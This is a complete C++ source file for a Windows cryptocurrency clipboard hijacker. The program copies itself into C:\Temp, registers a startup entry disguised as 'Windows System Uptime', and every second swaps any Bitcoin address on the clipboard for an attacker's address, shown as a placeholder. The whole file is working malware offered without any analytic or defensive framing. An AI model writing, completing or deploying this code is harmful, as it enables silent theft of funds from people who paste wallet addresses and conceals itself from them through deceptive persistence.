#include <windows.h>
#include <iostream>
#include <regex>
#include <stdio.h>
#include <stdlib.h>
#include <tchar.h>
#include <filesystem>
using namespace std;

void setClipboard(char newText[]) {
    const size_t len = strlen(newText) + 1;
    HGLOBAL hMem =  GlobalAlloc(GMEM_MOVEABLE, len);
    memcpy(GlobalLock(hMem), newText, len);
    GlobalUnlock(hMem);
    OpenClipboard(0);
    EmptyClipboard();
    SetClipboardData(CF_TEXT, hMem);
    CloseClipboard();
}

char* getClipboard() {
    if (OpenClipboard(NULL)) {
        HANDLE hData = GetClipboardData(CF_TEXT);
        char* clipText = (char*) hData;
        CloseClipboard();
        return clipText;
    }
    CloseClipboard();
    return NULL;
}

bool validateAddress(char address[]) {
    regex pattern("^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$");
    if (regex_match(address, pattern)) {
        return true;
    } else {
        return false;
    }
}

void addStartup(char save_path[] ) {
    HKEY hKey;
    LONG lnRes = RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
    if( ERROR_SUCCESS == lnRes ) {
        lnRes = RegSetValueEx(hKey, "Windows System Uptime", 0, REG_SZ, (BYTE*) save_path, strlen(save_path));
        RegCloseKey(hKey);
    }
}


void copy_self(char filename[], char save_path[], char create_path[]) {
    CreateDirectory(create_path, NULL);
    if (filesystem::exists(save_path)) {
        return; 
    }
    else {
        CopyFile(filename, save_path, FALSE);
    }
    
}

int main(int argc, char *argv[]) {
    char create_path[] = "C:\\Temp\\";
    char save_path[] = "C:\\Temp\\manager.exe";
    char address[] = "PLACEHOLDER";
    copy_self(argv[0], save_path, create_path);
    addStartup(save_path);
    for ( ; ; ) {
        if (validateAddress(getClipboard())) {
            setClipboard(address);
        }
        Sleep(1000);
    }
    return 0;
}
